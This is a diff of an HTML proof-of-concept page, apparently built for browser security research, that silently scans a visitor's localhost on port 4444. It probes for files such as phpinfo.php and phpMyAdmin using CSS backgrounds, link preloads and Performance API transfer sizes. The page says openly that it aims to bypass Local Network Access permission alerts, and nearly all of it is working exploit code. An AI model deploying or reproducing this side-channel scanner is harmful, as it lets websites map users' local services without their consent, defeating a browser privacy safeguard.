@@ -1,74 +1,83 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>LNA Local-Pretense Auditor</title>
+    <title>LNA Silent Recon - Size Oracle</title>
     <style>
-        body { background: #000; color: #0f0; font-family: monospace; padding: 20px; }
-        .success { color: #00ff00; font-weight: bold; border-left: 3px solid #0f0; padding-left: 5px; }
+        body { background: #000; color: #00ff41; font-family: 'Courier New', monospace; padding: 20px; }
+        .terminal { border: 1px solid #00ff41; padding: 15px; background: #050505; max-width: 850px; margin: auto; }
+        .success { color: #00ff00; font-weight: bold; }
         .notfound { color: #ff0055; font-weight: bold; }
-        .console { border: 1px solid #0f0; padding: 15px; background: #050505; max-width: 800px; margin: auto; }
-        button { background: #0f0; color: #000; border: none; padding: 12px; width: 100%; cursor: pointer; font-weight: bold; }
+        .log-box { height: 400px; overflow-y: auto; border-top: 1px solid #333; margin-top: 15px; font-size: 13px; }
+        button { background: #00ff41; color: #000; border: none; padding: 12px; width: 100%; font-weight: bold; cursor: pointer; }
+        /* Hidden container to trigger CSS loads */
+        #stealth-container { display: none; }
     </style>
 </head>
 <body>
 
-<div class="console">
-    <h2>LNA BYPASS: LOCALHOST SIZE ORACLE</h2>
-    <p>Pretending Local-Origin to extract precise Transferred Size metadata.</p>
-    <button onclick="runLocalAudit()">EXECUTE LOCAL PREV PRIVILEGE SCAN</button>
-    <div id="display" style="margin-top:20px;"></div>
+<div class="terminal">
+    <h2>LNA SILENT RECON v10.0</h2>
+    <p>Bypassing UI Alerts via Performance Timing & CSS Backgrounds</p>
+    <button onclick="runSilentAudit()">EXECUTE SILENT AUDIT</button>
+    
+    <div id="log" class="log-box">> Ready for stealth discovery...</div>
 </div>
 
+<div id="stealth-container"></div>
+
 <script>
-    const targetPaths = [
+    const paths = [
         "/favicon.ico", 
         "/dashboard/phpinfo.php", 
         "/phpmyadmin/index.php", 
-        "/icons/apache_pb.gif",
-        "/wrong_file_test_" + Math.random().toString(36).substring(7)
+        "/icons/apache_pb.gif", 
+        "/wrong_path_test_" + Math.random().toString(36).substring(7)
     ];
 
-    async function probeLocalSize(url) {
-        try {
-            // Using preload to bypass alerts while hit-testing size
-            const link = document.createElement('link');
-            link.rel = "preload";
-            link.as = "image";
-            link.href = url + "?cb=" + Date.now();
-            document.head.appendChild(link);
+    async function probeSize(url) {
+        // Technique 1: CSS Background (Often bypasses Fetch alerts)
+        const div = document.createElement('div');
+        div.style.backgroundImage = `url('${url}?cb=${Date.now()}')`;
+        document.getElementById('stealth-container').appendChild(div);
 
-            // Fetch to ensure network stack processes the request
-            await fetch(url, { mode: 'no-cors', cache: 'no-store', keepalive: true });
-            
-            await new Promise(r => setTimeout(r, 300));
-            const entry = performance.getEntriesByName(url).pop();
-            
-            if (entry) {
-                const size = entry.transferSize || entry.encodedBodySize || 0;
-                // Evidence: 404 error page is ~537B
-                // Real files (like phpinfo) are > 80kB
-                if (size > 600) {
-                    return { status: "200 OK", size: (size/1024).toFixed(2) + " KB" };
-                } else if (size > 0) {
-                    return { status: "404 Not Found", size: size + " B" };
-                }
+        // Technique 2: Link Preload (Confirmed silent in image_fabe78.png)
+        const link = document.createElement('link');
+        link.rel = "preload";
+        link.as = "image";
+        link.href = url + "?lp=" + Date.now();
+        document.head.appendChild(link);
+
+        // Wait for network stack to process metadata
+        await new Promise(r => setTimeout(r, 800));
+
+        // Technique 3: Performance API extraction
+        const entries = performance.getEntriesByType('resource');
+        const entry = entries.filter(e => e.name.includes(url)).pop();
+
+        if (entry) {
+            const size = entry.transferSize || entry.encodedBodySize || 0;
+            // Evidence: 404 error page signature is ~537B
+            if (size > 600) {
+                return { status: "200 OK (Found)", size: (size/1024).toFixed(2) + " KB", class: "success" };
+            } else if (size > 0) {
+                return { status: "404 Not Found", size: size + " B", class: "notfound" };
             }
-            return { status: "Blocked/Timeout", size: "0 B" };
-        } catch (e) { return { status: "Security Blocked", size: "N/A" }; }
+        }
+        return { status: "Blocked / No Data", size: "0 B", class: "notfound" };
     }
 
-    async function runLocalAudit() {
-        const display = document.getElementById('display');
-        const port = 4444; 
-        display.innerHTML = `[!] Initiating Local Pretense Audit on :${port}...<br><br>`;
+    async function runSilentAudit() {
+        const log = document.getElementById('log');
+        const port = 4444; // Active port from findings
+        log.innerHTML = `[!] Initiating Silent Audit on 127.0.0.1:${port}...<br>`;
 
-        for (let path of targetPaths) {
-            const url = `http://127.0.0.1:${port}${path}`;
-            const res = await probeLocalSize(url);
-            
-            let statusClass = (res.status === "200 OK") ? "success" : "notfound";
-            display.innerHTML += `<div>Path: ${path} -> <span class="${statusClass}">${res.status} (${res.size})</span></div>`;
+        for (let p of paths) {
+            const url = `http://127.0.0.1:${port}${p}`;
+            const res = await probeSize(url);
+            log.innerHTML += `<br>Path: ${p} <br> -> Result: <span class="${res.class}">${res.status}</span> (Size: ${res.size})`;
+            log.scrollTop = log.scrollHeight;
         }
+        log.innerHTML += "<br><br><b>[!] Audit Complete. Check Performance Tab for Metadata Leak.</b>";
     }
 </script>
 </body>
